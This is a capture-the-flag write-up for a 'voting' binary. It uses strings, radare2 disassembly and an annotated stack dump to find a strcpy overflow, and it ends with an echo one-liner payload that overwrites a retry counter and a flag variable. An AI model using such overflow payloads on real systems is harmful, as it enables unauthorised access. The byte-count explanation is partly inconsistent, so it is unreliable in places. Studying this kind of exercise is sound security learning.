### voting

#### Running the program:
```
$ ./voting 
Government Secret Voting System

Password required
Please enter the DEAR password:
```
#### Goal of the program:
- Find a flag in the binary 

#### Limitations
The binary provided is a non-exact copy of the original binary running on a given host (e.g. `telnet http://example.com 3030`). 
In other words, finding the password in the provided binary does not solve the problem since it's different on the host.

#### Strings command
Using strings command, we can list all the strings in the binary, `strings ./voting`. By analyzing the result of that command,
we can guess that the password for the provided binary is `DEMO`. Again, as mentioned previously, this password does not give
much information since it will be different on the host.

#### Radare2
It's time for radare2. By analzying the instructions of the program, we can notice the following systems calls:
```
....
sym.imp.printf @ 0x004007c1 // Password required. Please enter the DEAR password:
sym.imp.memset @ 0x004007da // Allocate memory for storing the use input
sym.imp.__isoc99_scanf @ 0x004007f3 // Read input from the user, and store it @ rbp-0x400
sym.imp.strcpy @ 0x0040080c // Copy the input string to memory address @rbp-0x450
sym.imp.strcmp @ 0x00400820 // Compare the input with the expected password, remember that this is not helpful since we don't know the password on the host
...
```
Furthermore, we can notice the following instructions:
```
...
eax = [rbp-0x408] @ 0x0040070a // Store byte at rbp-0x408 into eax
cmp eax, 0x1 @ 0x00400710 // Check if this byte is equal to 0x00000001, if yes then print the **secret message**
...
eax = [rbp-0x410] @ 0x00400849 // Store byte at rbp-0x410 into eax
eax += 0x1 @ 0x0040084f // Add 1 to the value of eax
[rbp-0x410] = eax @ 0x00400852 // Store the new resulting byte into rbp-0x410
eax = [rbp-0x410] @ 0x00400858 // Store it back into eax
cmp eax, 0x2 @ 0x0040085e // Check if the calculated byte is equal to 0x00000002, if yes then this is the last chance for entering the password 
...
Then code goes back to the beginning of thise block of instructions. `@ 0x0040070a`
```
Clearly, what is desired is having the value of the eax register to be equal to 0x00000001 for the comparison @ 0x00400710 
to evaluate to true and get the flag. One method to satisfy the comparison, is to enter the right password, but again this 
method should be avoided since the password is unknown on the original binary. Another method is to find a way to alter 
this the value of the register from the input!

Taking a snapshot of the memory at after executing the strcpy system call mentioned in the previous block of instruction 
displays the following:
```
db 0x00400811
dc
Please enter the DEAR password:EXAMPLE!!!
px @rbp-0x450
- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  0123456789ABCD
0x7ffcfeb35a80  4558 414d 504c 4521 2121 0000 0000  EXAMPLE!!!....
0x7ffcfeb35a8e  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35a9c  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35aaa  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35ab8  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35ac6  0000 0000 0000 fc7f 0000 4558 414d  ..........EXAM
0x7ffcfeb35ad4  504c 4521 2121 0000 0000 0000 0000  PLE!!!........
0x7ffcfeb35ae2  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35af0  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35afe  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35b0c  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35b1a  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35b28  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35b36  0000 0000 0000 0000                 ........      
```

Let's annotate this memory snapshot:
```
- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  0123456789ABCD
                v Beginning of the copied input 
0x7ffcfeb35a80  4558 414d 504c 4521 2121 0000 0000  EXAMPLE!!!....
0x7ffcfeb35a8e  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35a9c  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35aaa  0000 0000 0000 0000 0000 0000 0000  ..............
                                    v cmp eax, 0x2 @ 0x0040085e, if this is greater than 0x00000002, then code exists
0x7ffcfeb35ab8  0000 0000 0000 0000 0000 0000 0000  ..............
                     | cmp eax, 0x1 @ 0x00400710, if this is 0x00000001 (also 0x1), then we get the flag 
                     v                   v Original input location
0x7ffcfeb35ac6  0000 0000 0000 fc7f 0000 4558 414d  ..........EXAM
0x7ffcfeb35ad4  504c 4521 2121 0000 0000 0000 0000  PLE!!!........
0x7ffcfeb35ae2  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35af0  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35afe  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35b0c  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35b1a  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35b28  0000 0000 0000 0000 0000 0000 0000  ..............
0x7ffcfeb35b36  0000 0000 0000 0000                 ........      
```

So now it's obvious that overflowing the input string can manipulates the value of the eax register when it's compared to 0x1 and will give us the flag. 

#### Answer
```
echo -n -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xff\xff\xff\xff\xff\xff\xff\xff\x01" | ./voting
```
The answer was not guessed, but it has reasoning which is constructed through a trial and error process. The first 64 `a`'s are required to fill the bytes just before overflowing the input buffer. The next 8 `f`'s (2 bytes of `f`) are needed because the counter that checks if too many failed attemps occurred increments that value by 1 just before comparing it to 0x2. By adding 1 to that value, the register eax which will hold the result will have the value of 0x00000000 satisfying the comparison condition. The remaining `f` bytes are needed to fill the memory until hitting the memory address used for revealing the flag. The \x01 is needed to alter the eax register value when compared to 0x01 which will result in revealing the flag.
